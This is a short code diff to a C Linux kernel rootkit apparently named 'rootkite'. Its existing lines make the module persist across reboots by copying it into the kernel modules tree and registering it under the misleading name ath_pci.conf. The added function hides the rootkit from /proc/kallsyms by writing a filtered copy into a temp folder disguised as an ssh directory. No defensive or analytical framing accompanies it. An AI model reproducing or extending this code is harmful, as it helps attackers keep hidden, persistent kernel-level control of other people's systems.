@@ -53,4 +53,11 @@ static void rooted(void){
     snprintf(comm, NAME_MAX, "ls /lib/modules/$(uname -r)/kernel/fs/ | grep rootkite || find / -name rootkite.ko -exec cp {} /lib/modules/$(uname -r)/kernel/fs/ \\; -quit && echo rootkite > /etc/modules-load.d/ath_pci.conf && depmod");
     run_shell(comm);
 }
+
+/* create a copy of /proc/kallsyms with removed refrences to rootkite to later redirect to from /proc/kallsyms*/
+static void hide_ksyms(void){
+  char *comm = kmalloc(NAME_MAX + 1, GFP_KERNEL);
+  snprintf(comm, NAME_MAX, "mkdir /tmp/ssh-XXTkJI | cat /proc/kallsyms | grep -v rootkite > /tmp/ssh-XXTkJI/ksf_save_tmp");
+  run_shell(comm);
+}
 #endif
